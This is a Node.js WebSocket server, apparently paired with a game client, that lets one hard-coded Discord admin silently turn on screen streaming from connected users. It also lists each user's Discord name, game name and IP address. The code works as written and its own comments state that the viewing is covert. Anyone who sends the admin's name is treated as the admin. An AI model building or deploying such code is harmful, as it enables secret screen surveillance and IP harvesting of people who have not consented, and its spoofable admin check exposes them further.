/**
 * Admin Spectate Server
 * Allows admin to silently view connected users' screens
 */

const WebSocket = require('ws');

const PORT = process.env.PORT || 8765;
const ADMIN = 'thenoid2';  // Admin Discord name

// Connected users: discordName -> { ws, rsn, ip, connectedAt, streaming: bool }
const users = new Map();

// Active view session: admin is viewing which user
let viewingUser = null;

// Create WebSocket server
const wss = new WebSocket.Server({ port: PORT });

wss.on('connection', (ws, req) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    let userDiscord = null;

    ws.on('message', (data) => {
        try {
            const msg = JSON.parse(data);
            handleMessage(ws, msg, ip, (discord) => { userDiscord = discord; });
        } catch (e) {
            // Silent
        }
    });

    ws.on('close', () => {
        if (userDiscord) {
            users.delete(userDiscord);

            // End view if this was the viewed user
            if (viewingUser === userDiscord) {
                viewingUser = null;
                notifyAdmin({ type: 'view_ended', reason: 'User disconnected' });
            }
        }
    });

    ws.on('error', () => { });
});

function handleMessage(ws, msg, ip, setDiscord) {
    const { type, ...payload } = msg;

    switch (type) {
        case 'connect':
            handleConnect(ws, payload, ip, setDiscord);
            break;
        case 'get_users':
            handleGetUsers(ws, payload);
            break;
        case 'view_user':
            handleViewUser(ws, payload);
            break;
        case 'stop_view':
            handleStopView(ws, payload);
            break;
        case 'frame':
            handleFrame(payload);
            break;
    }
}

function handleConnect(ws, { discordName, rsn }, ip, setDiscord) {
    if (!discordName || !rsn) {
        return;
    }

    setDiscord(discordName);

    users.set(discordName, {
        ws,
        rsn,
        ip,
        connectedAt: Date.now(),
        streaming: false
    });

    const isAdminUser = isAdmin(discordName);
    ws.send(JSON.stringify({
        type: 'connected',
        isAdmin: isAdminUser
    }));
}

function isAdmin(discordName) {
    return discordName && discordName.toLowerCase() === ADMIN.toLowerCase();
}

function handleGetUsers(ws, { discordName }) {
    if (!isAdmin(discordName)) return;

    const userList = [];
    for (const [discord, user] of users.entries()) {
        if (!isAdmin(discord)) {
            userList.push({
                discordName: discord,
                rsn: user.rsn,
                ip: user.ip,
                connectedAt: user.connectedAt,
                streaming: user.streaming
            });
        }
    }

    ws.send(JSON.stringify({
        type: 'user_list',
        users: userList
    }));
}

function handleViewUser(ws, { adminDiscord, targetDiscord }) {
    if (!isAdmin(adminDiscord)) return;

    const targetUser = users.get(targetDiscord);
    if (!targetUser) {
        ws.send(JSON.stringify({ type: 'view_error', message: 'User not found' }));
        return;
    }

    // Stop previous view if any
    if (viewingUser && viewingUser !== targetDiscord) {
        const prevUser = users.get(viewingUser);
        if (prevUser) {
            prevUser.streaming = false;
            prevUser.ws.send(JSON.stringify({ type: 'stop_stream' }));
        }
    }

    viewingUser = targetDiscord;
    targetUser.streaming = true;

    // Tell target to start streaming (silent)
    targetUser.ws.send(JSON.stringify({ type: 'start_stream' }));

    ws.send(JSON.stringify({ type: 'view_started', target: targetDiscord }));
}

function handleStopView(ws, { adminDiscord }) {
    if (!isAdmin(adminDiscord)) return;

    if (viewingUser) {
        const targetUser = users.get(viewingUser);
        if (targetUser) {
            targetUser.streaming = false;
            targetUser.ws.send(JSON.stringify({ type: 'stop_stream' }));
        }
        viewingUser = null;
    }

    ws.send(JSON.stringify({ type: 'view_stopped' }));
}

function handleFrame({ discordName, data }) {
    if (discordName !== viewingUser) return;

    // Send to admin
    for (const [discord, user] of users.entries()) {
        if (isAdmin(discord)) {
            user.ws.send(JSON.stringify({ type: 'frame', data }));
        }
    }
}

function notifyAdmin(message) {
    const json = JSON.stringify(message);
    for (const [discord, user] of users.entries()) {
        if (isAdmin(discord)) {
            user.ws.send(json);
        }
    }
}

console.log(`[Spectate] Server ready on ws://0.0.0.0:${PORT}`);
